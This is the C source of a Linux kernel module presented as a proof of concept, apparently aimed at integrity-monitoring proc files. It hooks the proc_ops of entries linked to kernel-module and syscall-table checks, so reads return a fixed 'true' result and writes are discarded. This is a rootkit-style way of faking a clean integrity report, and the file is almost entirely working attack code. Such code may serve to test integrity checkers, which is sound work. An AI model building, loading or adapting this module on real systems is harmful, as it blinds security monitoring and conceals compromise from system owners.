// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_proc_takeover"
#define POC_DESC "inte poc fake proc content"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);

static void **slot_ko;
static void **slot_systbl;

static const char fake_text[] = "1700000000000:true\n";

static ssize_t fake_read(struct file *file, char __user *buf, size_t count,
			 loff_t *ppos)
{
	size_t length = sizeof(fake_text) - 1;
	size_t left;

	if (*ppos >= length)
		return 0;
	left = length - *ppos;
	if (count > left)
		count = left;
	if (copy_to_user(buf, fake_text + *ppos, count))
		return -EFAULT;
	*ppos += count;
	return count;
}

static ssize_t fake_write(struct file *file, const char __user *buf,
			  size_t count, loff_t *ppos)
{
	return count;
}

static const struct proc_ops fake_ops = {
	.proc_read = fake_read,
	.proc_write = fake_write,
};

static int __init poc_init(void)
{
	void *orig;
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (poc_proc_ko_entry) {
		ret = poc_proc_slot(poc_proc_ko_entry, &slot_ko);
		if (ret)
			return ret;
		ret = hk_ptr_hook(slot_ko, (void *)&fake_ops, &orig);
		if (ret)
			return ret;
	}
	if (poc_proc_syscall_table_entry) {
		ret = poc_proc_slot(poc_proc_syscall_table_entry, &slot_systbl);
		if (!ret)
			hk_ptr_hook(slot_systbl, (void *)&fake_ops, &orig);
	}
	poc_info("proc takeover installed");
	return 0;
}

static void __exit poc_exit(void)
{
	if (slot_ko)
		hk_ptr_unhook(slot_ko);
	if (slot_systbl)
		hk_ptr_unhook(slot_systbl);
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
